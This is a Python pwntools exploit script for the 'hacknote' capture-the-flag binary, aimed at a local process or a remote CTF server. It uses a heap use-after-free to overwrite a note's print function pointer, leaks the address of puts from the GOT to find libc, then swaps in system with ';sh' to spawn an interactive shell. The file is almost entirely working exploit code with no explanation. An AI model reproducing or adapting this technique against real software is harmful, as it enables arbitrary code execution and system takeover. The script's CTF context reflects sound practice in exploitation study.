import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./hacknote')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./hacknote')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29057)
			elf=ELF('./hacknote')
			libc=ELF('../../i386libc/x86_libc.so.6')

		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Note size :',str(a))
			io.sendafter('Content :',c)

		def delete(a):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))


		def show(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))
		




		add(0x10,'/bin/sh\x00')
		add(0x10,'/bin/sh\x00')
		delete(0)
		delete(1)
		add(0x8,p32(0x804862B)+p32(elf.got['puts']))
		show(0)
		libc_base=u32(io.recv(4))-libc.sym['puts']
		libc.address=libc_base
		delete(2)
		add(0x8,p32(libc.sym['system'])+';sh\x00')
		success('libc_base:'+hex(libc_base))
		show(0)
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue